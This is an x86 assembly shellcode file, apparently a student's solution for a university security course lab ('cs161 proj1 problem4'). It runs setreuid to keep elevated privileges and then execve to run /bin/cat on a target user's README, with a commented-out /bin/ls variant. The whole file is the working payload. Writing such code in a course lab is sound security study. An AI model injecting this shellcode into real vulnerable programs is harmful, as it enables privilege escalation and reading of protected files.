// recolic: the shellcode provided by cs161 doesn't work.
// so I have to rewrite it for proj1 problem4

push   $0x31
pop    %eax
int    $0x80
mov    %eax,%ebx
mov    %eax,%ecx
push   $0x46
pop    %eax
int    $0x80

xor    %eax,%eax

// \0\0\0\0
push   %eax
// /bin /cat
push   $0x7461632f
push   $0x6e69622f

//mov %esp %ebx
push %esp
pop %ebx

// \0\0\0\0
push   %eax
// /hom e/jz //RE ADME
push   $0x454d4441
push   $0x45522f2f
push   $0x7a6a2f65
push   $0x6d6f682f

//mov %esp %ecx
push %esp
pop %ecx


//// \0\0\0\0
//push   %eax
//// /bin //ls
//push   $0x736c2f2f
//push   $0x6e69622f
//
//push   %esp
//pop    %ebx

// \0\0\0\0 NULL
push   %eax
// &arg[1]
push   %ecx
// &arg[0]
push   %ebx

mov    %esp,%ecx
xor    %edx,%edx
mov    $0xb,%al
int    $0x80

